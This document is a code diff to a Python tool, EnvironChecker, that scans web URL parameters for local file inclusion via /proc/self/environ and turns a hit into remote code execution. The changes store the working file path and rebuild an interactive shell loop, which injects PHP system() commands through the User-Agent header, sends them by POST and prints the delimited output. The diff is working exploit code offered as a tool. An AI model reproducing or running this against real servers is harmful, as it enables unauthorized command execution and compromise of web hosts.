@@ -20,6 +20,7 @@ class EnvironChecker:
         self.url =self.ensure_correct_protocol(url)
         self.depth = depth
         self.silent = silent
+        self.return_filepath = None
         self.random_user_agent = self._generate_random_string()
         self.LFI_TEST_FILES = [
             ('/proc/self/environ', re.compile(fr'{self.random_user_agent}')),
@@ -64,13 +65,13 @@ class EnvironChecker:
 
         if not self.silent:
             with Progress(console=self.console) as progress:
-                return self._scan(params, file_paths, parsed_url, self.console, total_operations, progress)
+                return self._scan(params, file_paths, parsed_url, total_operations, progress)
 
-        return self._scan(params, file_paths, parsed_url, self.console)
+        return self._scan(params, file_paths, parsed_url)
 
-    def _scan(self, params, file_paths, parsed_url, console, total_operations=None, progress=None):
+    def _scan(self, params, file_paths, parsed_url,  total_operations=None, progress=None):
         task = progress.add_task("[cyan]Scanning...", total=total_operations) if progress else None
-
+        
         headers = {'User-Agent': self.random_user_agent}
 
         for param_name in params.keys():
@@ -84,10 +85,11 @@ class EnvironChecker:
                     response = requests.get(fuzzed_url, headers=headers, verify=False)
                 except requests.exceptions.ConnectionError:
                     self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
-                    return False    
+                    return False, None    
 
                 if any(header in response.text for header in self.HTTP_HEADERS):
                     if file_regex.search(response.text):
+                        self.return_filepath = file_path
                         if not self.silent:
                             self.console.print(f'\n[bold red]Possible LFI2RCE detected (proc_self_environ: method)[/bold red] (/proc/self/environ method)', style='bold red')
                         return True, param_name
@@ -98,8 +100,18 @@ class EnvironChecker:
         return False, None
     
     def run_shell(self, param_name):
+        self.silent = True
+        result, param_name = self.environ_check()
 
-        if self.environ_check():
+        if result:
+            parsed_url = urllib.parse.urlparse(self.url)
+            params = urllib.parse.parse_qs(parsed_url.query)
+            new_params = params.copy()
+            new_params[param_name] = self.return_filepath
+            new_query = urllib.parse.urlencode(new_params, doseq=True)
+            fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
+            self.console.print("[bold yellow]Interactive shell is ready. Type your commands.[/bold yellow]")
+
             session = PromptSession(history=InMemoryHistory())        
             while True:
                 try:
@@ -116,25 +128,17 @@ class EnvironChecker:
                     if cmd.lower() in ["exit", "quit"]:
                         break
                     
-                    cmd = "<?php echo '['; echo 'S]'; system('{cmd}'); echo '[E]';?>"
-                    parsed_url = urllib.parse.urlparse(self.url)
-                    params = urllib.parse.parse_qs(parsed_url.query)
-                    new_params = params.copy()
-                    new_params[param_name] = cmd
-                    new_query = urllib.parse.urlencode(new_params, doseq=True)
-
-                    fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
-                    
+                    cmd = f"<?php echo '['; echo 'S]'; system('{cmd}'); echo '[E]';?>"
                     headers = {'User-Agent': cmd}
                     
                     try:
-                        response = requests.get(fuzzed_url, headers=headers, verify=False)
+                        response = requests.post(fuzzed_url, headers=headers, verify=False)
                     except requests.exceptions.ConnectionError:
                         self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
 
                     pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL) 
                     response_content = pattern.search(response.text)
-                    if response_content:
+                    if response_content and response_content.group(1):
                         shell_output = response_content.group(1)
                         self.console.print(f"[bold green]{shell_output}[/bold green]")
                     else:
